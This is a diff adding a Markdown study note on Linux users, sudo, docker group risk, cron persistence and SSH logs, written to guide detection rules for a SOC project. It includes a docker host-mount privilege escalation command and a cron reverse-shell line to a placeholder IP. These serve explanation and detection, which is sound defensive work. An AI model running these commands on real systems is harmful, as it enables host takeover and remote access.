@@ -1,0 +1,571 @@
+# 📌 SECTION 1 — Linux Users & Privilege Model
+
+---
+
+## 1️⃣ User Basics
+
+Each Linux user has:
+
+* **Username**
+* **UID (User ID)**
+* **Primary Group (GID)**
+* Home directory
+* Default shell
+
+Check user:
+
+```bash
+id username
+```
+
+Example:
+
+```
+uid=1000(catpuccino)
+gid=1000(catpuccino)
+groups=1000(catpuccino),27(sudo),126(docker)
+```
+
+---
+
+## 🔹 UID Meaning
+
+* `UID = 0` → root (superuser)
+* `UID ≥ 1000` → normal users (usually)
+
+Root has unrestricted system control.
+
+---
+
+## 🔹 Primary Group (User Private Group Model)
+
+Linux often creates:
+
+* User: `catpuccino`
+* Group: `catpuccino`
+
+This improves file isolation.
+
+Files created by user default to:
+
+```
+owner = user
+group = user’s primary group
+```
+
+---
+
+## 🔹 Secondary Groups (CRITICAL FOR SECURITY)
+
+Groups define additional privileges.
+
+Important groups you saw:
+
+| Group   | Meaning                   | Security Impact               |
+| ------- | ------------------------- | ----------------------------- |
+| sudo    | Can use sudo              | Privilege escalation possible |
+| docker  | Can control Docker daemon | Root-equivalent risk          |
+| adm     | Can read logs             | Sensitive visibility          |
+| plugdev | USB access                | Moderate                      |
+| lpadmin | Printer admin             | Low                           |
+| users   | Generic group             | Low                           |
+
+---
+
+# 🚨 SECURITY PRINCIPLE
+
+Privilege is not just:
+
+```
+UID == 0
+```
+
+It is also:
+
+* Membership in sudo
+* Membership in docker
+* Access to privileged daemons
+
+Your detection engine must check **group membership changes**.
+
+---
+
+# 📌 SECTION 2 — sudo Deep Understanding
+
+---
+
+## 🔹 What sudo Actually Does
+
+When you run:
+
+```bash
+sudo command
+```
+
+It:
+
+1. Checks `/etc/sudoers`
+2. Verifies user identity (your password)
+3. Temporarily executes command as root (UID 0)
+4. Logs the action
+
+It does NOT use root password.
+
+---
+
+## 🔹 Why It Asks User Password
+
+Because sudo verifies:
+
+> “You are this authorized user.”
+
+It preserves:
+
+* Accountability
+* Audit trail
+* Per-user logging
+
+Logs stored in:
+
+```
+/var/log/auth.log
+```
+
+Example log entry:
+
+```
+catpuccino : USER=root ; COMMAND=/usr/bin/apt update
+```
+
+---
+
+## 🔹 sudo Binary is Setuid
+
+Check:
+
+```bash
+ls -l /usr/bin/sudo
+```
+
+You’ll see:
+
+```
+-rwsr-xr-x
+```
+
+The `s` means:
+
+Setuid → runs with owner privilege (root).
+
+---
+
+## 🔹 From SOC Perspective
+
+Monitor:
+
+* Repeated sudo failures
+* sudo used immediately after SSH login
+* sudo used by unusual accounts
+* NOPASSWD entries in sudoers
+
+---
+
+# 📌 SECTION 3 — Docker Privilege Escalation
+
+---
+
+## 🔹 Why Docker Runs as Root
+
+Docker daemon:
+
+```
+dockerd
+```
+
+Runs as root because it must:
+
+* Create namespaces
+* Mount filesystems
+* Configure networking
+* Manipulate cgroups
+* Bind low ports
+* Manage iptables
+
+These require privileged syscalls.
+
+---
+
+## 🔹 Why docker Group is Dangerous
+
+Members of docker group can:
+
+* Send commands to root-owned daemon
+* Mount host filesystem
+* Start privileged containers
+
+Example:
+
+```bash
+docker run -it -v /:/mnt ubuntu bash
+```
+
+Mounts host root inside container.
+
+Inside container:
+
+```
+chroot /mnt
+```
+
+Now full host access.
+
+This means:
+
+docker group ≈ root-level power.
+
+---
+
+## 🔹 Why It’s Not a “Bug”
+
+Docker assumes:
+
+docker group members = trusted administrators.
+
+Security boundary = group membership.
+
+---
+
+## 🔹 Why You Got Permission Denied
+
+Possible reasons:
+
+1. Docker service not running
+2. Session not refreshed after group addition
+3. Not actually in docker group
+4. Rootless docker setup
+
+Check:
+
+```bash
+ls -l /var/run/docker.sock
+systemctl status docker
+groups
+```
+
+---
+
+## 🔹 SOC Detection Ideas
+
+Monitor:
+
+* Access to `/var/run/docker.sock`
+* Container creation with:
+
+  * `--privileged`
+  * `-v /:/`
+* User added to docker group
+* Docker used right after SSH login
+
+Correlation example:
+
+SSH login → docker run → mount `/` → file change → HIGH ALERT
+
+---
+
+# 📌 SECTION 4 — Cron Jobs (Persistence Mechanism)
+
+---
+
+## 🔹 What Cron Does
+
+Cron daemon wakes every minute.
+
+If schedule matches:
+
+* Forks new process
+* Executes command
+* Does NOT check if previous instance running
+
+---
+
+## 🔹 Overlapping Execution
+
+Example:
+
+```
+* * * * * sleep 120
+```
+
+Every minute → new process.
+
+Multiple processes accumulate.
+
+Cron does NOT track duplicates.
+
+---
+
+## 🔹 Where Cron Jobs Exist
+
+User cron:
+
+```
+crontab -e
+/var/spool/cron/
+```
+
+System cron:
+
+```
+/etc/crontab
+/etc/cron.daily/
+```
+
+---
+
+## 🔹 Why Attackers Love Cron
+
+Used for:
+
+* Persistence
+* Reverse shell restart
+* Data exfiltration
+* Scheduled malicious execution
+
+Example malicious entry:
+
+```
+* * * * * bash -i >& /dev/tcp/IP/4444 0>&1
+```
+
+---
+
+## 🔹 Detection Strategy for Your Project
+
+Monitor:
+
+* Modifications to:
+
+  * `/etc/crontab`
+  * `/var/spool/cron`
+* Cron spawning unusual processes
+* Cron executing from `/tmp`
+* Cron spawning network connections
+* High frequency jobs
+
+Correlate:
+
+User login → cron modified → cron executes suspicious binary
+
+---
+
+# 📌 SECTION 5 — SSH & Post-Login Behavior
+
+---
+
+## 🔹 After SSH Login
+
+User can:
+
+* Run commands
+* Access files
+* Check group membership
+* Attempt privilege escalation
+
+Attack chain often looks like:
+
+1. SSH login
+2. Check `id`
+3. Check `sudo -l`
+4. Check docker access
+5. Create persistence
+6. Modify cron
+7. Install backdoor
+
+---
+
+## 🔹 Important Logs
+
+Ubuntu:
+
+```
+/var/log/auth.log
+```
+
+Monitor:
+
+* Failed logins
+* Successful logins
+* Root login attempts
+* SSH followed by sudo
+* SSH followed by docker usage
+
+---
+
+# 📌 SECTION 6 — First User & sudo
+
+On Ubuntu:
+
+First user created during installation:
+
+* Automatically added to sudo group
+* Root password locked
+
+So:
+
+First user = privileged account.
+
+From security perspective:
+Treat as high-value target.
+
+---
+
+# 📌 SECTION 7 — Privilege Escalation Paths You Learned
+
+---
+
+### 1️⃣ sudo group
+
+Escalation if password known.
+
+---
+
+### 2️⃣ docker group
+
+Escalation without sudo password.
+
+---
+
+### 3️⃣ Cron (if writable)
+
+Scheduled root execution.
+
+---
+
+### 4️⃣ Misconfigured file permissions
+
+Writable system files → full compromise.
+
+---
+
+# 📌 SECTION 8 — What This Means For YOUR SOC Project
+
+You are building:
+
+* Log ingestion engine
+* Correlation engine
+* UEBA
+* Detection logic
+
+You MUST detect:
+
+---
+
+## 🔥 High Risk Sequences
+
+### Pattern 1
+
+SSH login
+→ sudo usage
+→ new user creation
+
+---
+
+### Pattern 2
+
+SSH login
+→ docker container with `/` mount
+→ file change
+
+---
+
+### Pattern 3
+
+SSH login
+→ cron modification
+→ reverse shell process
+
+---
+
+### Pattern 4
+
+User added to docker group
+→ docker access used
+
+---
+
+### Pattern 5
+
+Repeated cron overlapping processes
+→ potential DoS or malicious persistence
+
+---
+
+# 📌 SECTION 9 — Key Technical Concepts You Must Remember
+
+---
+
+## 🔹 Security Boundary is NOT just UID 0
+
+It includes:
+
+* Group membership
+* Access to root daemons
+* File permissions
+* Cron configuration
+
+---
+
+## 🔹 Linux Trust Model
+
+Linux trusts:
+
+* Group membership
+* File ownership
+* Permission bits
+* Setuid binaries
+
+---
+
+## 🔹 Monitoring Strategy for Your Engine
+
+You should collect:
+
+* auth.log
+* sudo logs
+* cron file changes
+* process parent-child relationships
+* docker daemon activity
+* group membership changes
+* file integrity changes
+
+---
+
+# 📌 SECTION 10 — Important Mental Models
+
+---
+
+### 🔹 sudo = identity verification + temporary privilege
+
+### 🔹 docker group = control root daemon
+
+### 🔹 cron = automatic execution engine
+
+### 🔹 First Ubuntu user = privileged
+
+### 🔹 Privilege escalation = combination of small permissions
+
+---
+
+# 🎯 FINAL PROJECT-RELEVANT TAKEAWAYS
+
+Your detection engine must:
+
+1. Track users and groups.
+2. Identify privileged accounts.
+3. Monitor SSH logins.
+4. Monitor sudo usage.
+5. Monitor docker usage.
+6. Monitor cron modifications.
+7. Correlate sequences of actions.
+8. Flag abnormal behavior for high-privilege users.
+
